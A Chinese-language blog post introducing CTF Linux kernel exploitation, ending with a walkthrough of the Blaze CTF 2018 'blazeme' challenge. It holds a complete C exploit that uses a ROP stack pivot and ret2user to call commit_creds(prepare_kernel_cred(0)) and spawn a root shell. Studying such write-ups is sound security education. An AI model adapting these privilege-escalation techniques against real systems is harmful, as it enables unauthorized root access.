---
layout: post
title:  "CTF内核题目入门"
date:   2019-09-24 13:54:00
categories: pwn
tags: pwn
excerpt: 内核入门/CTF内核题目环境配置
mathjax: true
---

* content
{:toc}

### Overview 
在现代CTF中做多了用户态的堆栈溢出题目，如何平稳过渡到内核漏洞利用一直是比较头疼的事情。
这篇主要讲什么是内核以及和用户态利用有哪些区别，最后用一道题目讲解一下kernel的利用。

### 0x00 基础知识

#### 1. 什么是内核
* 两点主要功能：1.控制并与硬件进行交互  2. 提供程序的运行环境
* Loadable Kernel Modules(LKMs) 可加载的内核模块，一般是驱动或内核扩展，可以单独编译但是要被加载到内核中执行。加载内核模块的三个命令
  + insmod 将模块加载到内核中
  + rmmod 卸载
  + lsmod 列出已经加载的模块

* 系统调用：linux系统调用是内核封装给用户态程序的接口，系统调用号定义在文件 unistd_64.h / unistd_32.h 中
* 内存空间：内核有自己独立的内存空间,比用户态地址高
![vmmap](IMG/CTF_kernel_exploit/vmmap2.png)


* 常见内核函数：用户程序通过设备文件和内核模块交互，例如open,close 都对应着模块中的某些函数。
  + copy_from_user(void *to, const void *from, unsigned long n); 将用户空间的数据传送到内核空间
  + copy_to_user(void *to, const void *from, unsigned long n) 将内核空间的数据传送到用户空间
  + ioctl(int fd, unsigned long request, ...) 对设备的I/O通道进行管理,fd 是open打开设备返回的描述符,参数2是用户对设备的控制命令
  + kmalloc 内核中的内存分配函数
具体的我们在后面实际的题目中看。

* 关于内核编译,环境配置,内核调试等内容可以参考我博客的这一篇, 限于篇幅就不展开了。
https://pwnkk.github.io/2019/09/24/kernel_env_setup/


### 0x01 内核漏洞利用

首先回顾一下常规漏洞利用的流程：
1. 逆向分析程序,定位漏洞点        
2. 程序调试
3. 使用各种漏洞利用技术编写exp
4. getshell

以内核角度来看以上的流程
* 逆向分析/定位漏洞
内核模块以.ko 后缀结尾,都属于ELF文件,只是用到的函数有所区别，所以逆向方法上没有区别
内核的漏洞和用户态漏洞差不多，同样存在例如栈溢出,UAF,type confuison等漏洞类型,同理基本的漏洞利用技术，例如ROP,pointer overwrites,shellcode等都依然可用。

* 程序调试
调试采用qemu模拟，用gdb来调试内核模块。在qemu不行的情况下就只能寄希望于内核报错提示当前的stack,register,call trace信息，内核出错常常导致系统崩溃重启。

* getshell
用户态利用是从程序交互中获取shell, 内核利用的目的一般是提权。
内核使用cred 结构体判断进程权限，每个进程都有cred结构体，包含了uid，gid等

```
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC  0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
    unsigned    securebits; /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;  /* caps we're permitted */
    kernel_cap_t    cap_effective;  /* caps we can actually use */
    kernel_cap_t    cap_bset;   /* capability bounding set */
    kernel_cap_t    cap_ambient;    /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char   jit_keyring;    /* default keyring to attach requested
                     * keys to */
    struct key __rcu *session_keyring; /* keyring inherited over fork */
    struct key  *process_keyring; /* keyring private to this process */
    struct key  *thread_keyring; /* keyring private to this thread */
    struct key  *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void        *security;  /* subjective LSM security */
#endif
    struct user_struct *user;   /* real user ID subscription */
    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info;  /* supplementary groups for euid/fsgid */
    struct rcu_head rcu;        /* RCU deletion hook */
} __randomize_layout;
```
在内核里将cred中的uid,gid改成0提升权限,内核里有两个函数很方便prepare_kernel_cred和commit_creds,执行
commit_creds(prepare_kernel_cred(0)) 即可,函数地址从/proc/kallsyms获取。

```
/ $ grep prepare_kernel /proc/kallsyms
ffffffff810a1810 T prepare_kernel_cred
ffffffff81d91890 R __ksymtab_prepare_kernel_cred
ffffffff81dac968 r __kcrctab_prepare_kernel_cred
ffffffff81db9450 r __kstrtab_prepare_kernel_cred
/ $ grep commit_creds /proc/kallsyms
ffffffff810a1420 T commit_creds
ffffffff81d88f60 R __ksymtab_commit_creds
ffffffff81da84d0 r __kcrctab_commit_creds
ffffffff81db948c r __kstrtab_commit_creds
```

以上就是修改权限的过程,但是我们不能一直在内核里面，还要回到用户态，因为一些在用户态很轻易做的事情，在内核中反而变得不太容易。比如，修改文件，创建进程，联网等。
* 返回用户态
返回之前需要设置好 SS,user_stack,EFLAGS,CS,user_function_addr 这5个变量，再执行swapgs和iretq即可。
![](IMG/CTF_kernel_exploit/kernelrop.png)

其中user_stack 指向用户态的栈地址即可,user_function_addr 指向封装system("/bin/sh")的函数地址
另外CS,SS,EFLAGS则需要在用户态事先保存好，如下

```
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}
```

* swapgs是在当前GS寄存器的值和kernel GS的值进行交换

以上就是内核利用的大致步骤，接下来看一道题目

### 0x02 内核题目
内核利用有一些经典的题目，比如CTF-wiki中介绍的强网杯2018-core 和CISCN2017-babydriver 都是很经典的入门题,珠玉在前,我就不赘述了.
Blaze CTF 2018-blazeme : 题目用户名blazeme,密码guest

下载地址 https://devcraft.io/assets/blaze18/blazeme.tar.gz
解压出以下文件
blazeme.c(题目源码)  bzImage(内核镜像)  rootfs.ext2(文件系统)  run.sh 

漏洞分析：
* blazeme_write 
```
#define KBUF_LEN (64)

blazeme_write(struct file *file,const char __user *buf,size_t count, loff_t *ppos){
...
char str[512] = "Hello ";
kbuf = kmalloc(KBUF_LEN, GFP_KERNEL);
if (copy_from_user(kbuf, buf, count)) {
        kfree(kbuf);
        kbuf = NULL;
        goto out;
}

if (kbuf != NULL) {
        strncat(str, kbuf, strlen(kbuf));
        printk(KERN_INFO "%s", str);
}
```
漏洞点在于copy_from_user写入到kbuf堆中,再用strncat将str和kbuf中的值拼接起来
KBUF_LEN=64,每次申请64字节,但因为slub分配器和ptmalloc不一样,堆块数据之间没有间隔,因此可以多次申请填充出一个充满非0数据且大于512字节的块,造成栈溢出。


* 查看函数地址: 需要root权限
首先挂载镜像文件 `mount -t ext2 ./rootfs.ext2 /mnt/blaze`
修改其中的/etc/passwd 把blazeme的权限提上来, uid/gid都改成0即可

```
root@ubuntu# mount -t ext4 ./rootfs.ext2 /mnt/blaze/
root@ubuntu# umount /mnt/blaze
```
卸载后重新启动,查看函数地址

```
# grep commit_creds /proc/kallsyms
ffffffff81063960 T commit_creds
# grep prepare_kernel /proc/kallsyms
ffffffff81063b50 T prepare_kernel_cred
```

* 漏洞利用：
没有 kaslr可以使用固定地址,没有smep保护因此可以直接跳转到用户态来执行程序(ret2user)

1. 使用[extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)从bzImage中解析出vmlinux,用于寻找ROPgadget
`extract-vmlinux bzImage > vmlinux`

2. ropper 查找ROPgadget
`ropper --file ./vmlinux  > rop`导出的文件就有50M
作者选择了
`0xffffffff8109c604: mov esp, 0x1740000; ret;`
用这个地址覆盖返回地址,正好可以做栈迁移到0x1740000。将地址0x1740000用mmap申请出来,填充上用户态的提权函数地址即可。

3. 确定偏移
和用户态利用一样,需要定位到返回地址的偏移,可以从IDA中读取,IDA中查看溢出的str变量位置为rbp-0x210, 加上rbp的8字节就是0x218
0x218/64 = 8 ,也就是说8次写入后第九次就正好覆盖了返回地址。

也可以调试查看一下

先编写一个小demo
```
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
void main(){
  unsigned long pay[65];
  for(int i=0;i<64;i++){
      pay[i]=0x4242424242424242ull;
  }
  char *addr = "AAAAAAAA";
  strcat(pay,addr);

  int fd = open("/dev/blazeme", O_RDWR);
  for (int i=0;i<1000;i++) {
    write(fd, pay, 64);;
  }
}

```

修改一下启动脚本, 添加gdb调试端口
```
#!/bin/sh
/usr/bin/qemu-system-x86_64 -kernel bzImage -smp 1 -hda ./rootfs.ext2 -boot c -m 128M -append "root=/dev/sda nokaslr rw ip=10.0.2.15:10.0.2.2:10.0.2.2 console=tty1 console=ttyAMA0" -net nic,model=ne2k_pci -net user -nographic -gdb tcp::1234
```
我们要定位栈溢出的部分,在每次write操作下断点

```
# cat kallsyms | grep blaze
ffffffffc0000190 t blazeme_open [blazeme]
ffffffffc00002f0 t cleanup_module       [blazeme]
ffffffffc00001a0 t init_module  [blazeme]
ffffffffc0000010 t blazeme_read [blazeme]
ffffffffc0000000 t blazeme_close        [blazeme]
ffffffffc00001a0 t blazeme_init [blazeme]
ffffffffc0000050 t blazeme_write        [blazeme]
ffffffffc00002f0 t blazeme_exit [blazeme]
```
text段的基地址是0xffffffffc0000000

编写gdb调试脚本gdbsc 如下
```sh
set architecture i386:x86-64:intel
target remote :1234
add-symbol-file blazeme.ko 0xffffffffc0000000
file vmlinux
b *blaze_write
```
`gdb -x ./gdbsc` 开启gdb

下断点 




```
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

static void shell();
static void kernel_payload();

int __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

static void escalate_privs() { commit_creds(prepare_kernel_cred(0)); }

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
  asm volatile(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "pushfq\n"
      "popq %2\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
      :
      : "memory");
}

static void restore_state() {
  asm volatile(
      "swapgs ;"
      "movq %0, 0x20(%%rsp)\t\n" // user_ss
      "movq %1, 0x18(%%rsp)\t\n" // fake_stack
      "movq %2, 0x10(%%rsp)\t\n" // eflags
      "movq %3, 0x08(%%rsp)\t\n" // user_cs
      "movq %4, 0x00(%%rsp)\t\n" // shell_addr
      "iretq"
      :
      : "r"(user_ss), "r"((unsigned long)0x1740000), "r"(user_rflags), "r"(user_cs), "r"(shell));
}


static void kernel_payload() {
  escalate_privs();
  restore_state();
}

static void shell() {
  printf("Spawning shell\n");
  system("/bin/sh");
  exit(0);
}

int main() {
  commit_creds = (void *)0xffffffff81063960ull;
  prepare_kernel_cred = (void *)0xffffffff81063b50ull;
  save_state();

  unsigned long *fake_stack = mmap((void *)0x1700000, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED | MAP_GROWSDOWN, -1, 0);   
  fake_stack[0x40000 / 8] = (unsigned long)kernel_payload;
  //mmap申请内存伪造stack在0x40000的位置放上kernel_payload

  unsigned long pivot[8];
  for (int i = 0; i < 8; ++i) {
    pivot[i] = 0xffffffff8109c604ull;  // mov esp, 0x1740000; ret;
  }
  

  char payload[64];
  strncpy(payload, "AA", 2);
  strncpy(&payload[2], (const char *)pivot, 62);

  int fd = open("/dev/blazeme", O_RDWR);
  for (;;) {
    write(fd, payload, 64);;
  }
  return 0;
}

```

### 参考链接
* [blazeme writeup](https://devcraft.io/2018/04/25/blazeme-blaze-ctf-2018.html)
* [内核环境配置](https://xz.aliyun.com/t/2024)
* [内核利用入门 anciety](https://www.anquanke.com/post/id/86490)
* [Linux Kernel Exploitation](https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/kernel/ref/13_lecture.pdf)  

* https://github.com/vnik5287/kernel_rop/blob/master/rop_exploit.c
* https://devcraft.io/2018/04/25/blazeme-blaze-ctf-2018.html

* [查看linux内核源码的网站](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118)
